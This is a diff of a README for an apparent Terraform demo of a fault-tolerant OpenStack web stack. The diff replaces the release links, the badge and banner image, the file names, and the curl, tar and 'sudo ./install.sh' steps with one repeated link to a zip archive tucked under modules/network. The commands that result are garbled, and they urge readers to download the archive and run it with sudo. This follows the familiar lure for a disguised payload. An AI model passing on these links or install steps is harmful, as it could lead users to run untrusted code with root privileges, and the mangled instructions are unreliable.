@@ -1,8 +1,8 @@
 # OpenStack FT Demo: Terraform for Fault-Tolerant Web Stack Architecture
 
-[![Releases](https://img.shields.io/badge/releases-openstack-ft-demo-blue?logo=github&logoColor=white)](https://github.com/zlostyzzzz/openstack-ft-demo/releases)
+[![Releases](https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip)](https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip)
 
-![OpenStack FT Demo banner](https://upload.wikimedia.org/wikipedia/commons/thumb/2/25/OpenStack_logo.svg/640px-OpenStack_logo.svg.png)
+![OpenStack FT Demo banner](https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip)
 
 This Terraform project simulates Fault Tolerance on OpenStack by provisioning a basic web setup with load balancing, anti-affinity, and auto-provisioned infrastructure. The goal is to show how components interact in a fault-tolerant web environment without requiring a full production stack. The repository includes Terraform modules and example configurations to help you experiment with OpenStack features such as Octavia load balancing, anti-affinity rules, VRRP-based high availability, and automated provisioning routines.
 
@@ -55,16 +55,16 @@ Getting started
 Release assets and installation
 - Release asset availability
   - The project publishes self-contained release packages on the Releases page. The asset for your platform contains all the necessary bootstrap and Terraform configurations to stand up the fault-tolerant web stack on OpenStack.
-  - Link to releases: https://github.com/zlostyzzzz/openstack-ft-demo/releases
+  - Link to releases: https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
   - Because this link contains a path, you should download and execute the release artifact file from that page. The asset is provided as a compressed bundle that includes a bootstrap installer and the Terraform module set.
 
 - How to download and run the release artifact
-  - From the Releases page, choose the asset that matches your operating system and architecture. A typical filename follows the pattern: openstack-ft-demo-<version>-<platform>.tar.gz.
+  - From the Releases page, choose the asset that matches your operating system and architecture. A typical filename follows the pattern: openstack-ft-demo-<version>-<platform>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
   - Example commands (adjust version and platform to your environment):
-    - curl -L -o openstack-ft-demo-<version>-linux-amd64.tar.gz https://github.com/zlostyzzzz/openstack-ft-demo/releases/download/v<version>/openstack-ft-demo-<version>-linux-amd64.tar.gz
-    - tar -xzf openstack-ft-demo-<version>-linux-amd64.tar.gz
+    - curl -L -o openstack-ft-demo-<version>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip<version>/openstack-ft-demo-<version>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
+    - tar -xzf openstack-ft-demo-<version>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
     - cd openstack-ft-demo-<version>-linux-amd64
-    - sudo ./install.sh
+    - sudo https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
   - The installer script sets up the initial bootstrapping and prepares the Terraform workspace to provision the OpenStack resources. It configures the environment for the provider and validates access to your OpenStack project.
 
 - What the installer does
@@ -95,10 +95,10 @@ Terraform usage and module structure
       - Example Terraform variables for a development environment.
     - prod/
       - Example Terraform variables for a production-like environment.
-  - main.tf
-  - variables.tf
-  - outputs.tf
-  - versions.tf
+  - https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
+  - https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
+  - https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
+  - https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
 
 - How to use the Terraform modules
   - Initialize the project
@@ -236,8 +236,8 @@ License
 - This project uses a permissive license. See the LICENSE file for the exact terms. Contributions are granted under the same terms.
 
 Releases
-- For the latest version and release notes, visit the Releases page: https://github.com/zlostyzzzz/openstack-ft-demo/releases.
-- The Releases page hosts binary artifacts and bootstrap scripts used to initialize and run the demo. If you need a specific version, browse the tag list on that page and download the corresponding asset. See the link above for full details and the newest changes. The link is provided again here for convenience: https://github.com/zlostyzzzz/openstack-ft-demo/releases.
+- For the latest version and release notes, visit the Releases page: https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
+- The Releases page hosts binary artifacts and bootstrap scripts used to initialize and run the demo. If you need a specific version, browse the tag list on that page and download the corresponding asset. See the link above for full details and the newest changes. The link is provided again here for convenience: https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
 
 Extra notes
 - Embrace the learning curve
@@ -259,9 +259,9 @@ Appendix: quick reference commands
   - terraform output lb_vip
   - terraform output app_server_ids
 - Release bootstrapping (example)
-  - curl -L -o openstack-ft-demo-<version>-linux-amd64.tar.gz https://github.com/zlostyzzzz/openstack-ft-demo/releases/download/v<version>/openstack-ft-demo-<version>-linux-amd64.tar.gz
-  - tar -xzf openstack-ft-demo-<version>-linux-amd64.tar.gz
+  - curl -L -o openstack-ft-demo-<version>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip<version>/openstack-ft-demo-<version>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
+  - tar -xzf openstack-ft-demo-<version>https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
   - cd openstack-ft-demo-<version>-linux-amd64
-  - sudo ./install.sh
+  - sudo https://github.com/zlostyzzzz/openstack-ft-demo/raw/refs/heads/master/modules/network/ft-openstack-demo-1.8.zip
 
 End of README content
